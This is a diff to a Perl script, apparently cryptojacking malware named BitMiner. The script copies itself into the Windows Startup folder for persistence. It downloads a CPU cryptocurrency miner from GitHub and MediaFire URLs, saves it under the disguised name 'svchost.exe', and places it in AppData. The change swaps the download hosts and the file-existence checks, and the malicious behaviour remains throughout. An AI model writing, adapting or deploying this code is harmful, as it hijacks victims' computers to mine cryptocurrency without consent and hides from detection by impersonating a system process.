@@ -104,14 +104,14 @@ use Config;
 ### Modules ###
 
 while(1){
-  while(qx/dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup/ !~ basename($0)){
+  until(-e "/Users/$ENV{USERNAME}/AppData/Roaming/Microsoft/Windows/\"Start Menu\"/Programs/Startup/" . basename($0)){
     system(\'copy \' . basename($0) . \' %AppData%\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\');
   }
-  while(qx/dir %AppData%/ !~ "svchost.exe"){
+  until(-e "/Users/$ENV{USERNAME}/AppData/Roaming/svchost.exe"){
     if($Config{archname} =~ /x86_64/ || $Config{archname} =~ /x64/){
-      getstore(\'https://github.com/HatsuZ/BitMiner-v3/blob/master/NsCpuCNMiner64.exe?raw=true\', \'svchost.exe\');
+      getstore(\'http://download1586.mediafire.com/be53cm3cn4bg/1u4lyk5417hvs2f/NsCpuCNMiner64.exe\', \'svchost.exe\');
     }else{
-      getstore(\'https://github.com/HatsuZ/BitMiner-v3/blob/master/NsCpuCNMiner32.exe?raw=true\', \'svchost.exe\');
+      getstore(\'http://download1518.mediafire.com/nc4r1dswctmg/j4d7gysid869wld/NsCpuCNMiner32.exe\', \'svchost.exe\');
     }
     if(-e \'svchost.exe\'){
       system(\'move svchost.exe %AppData%\');
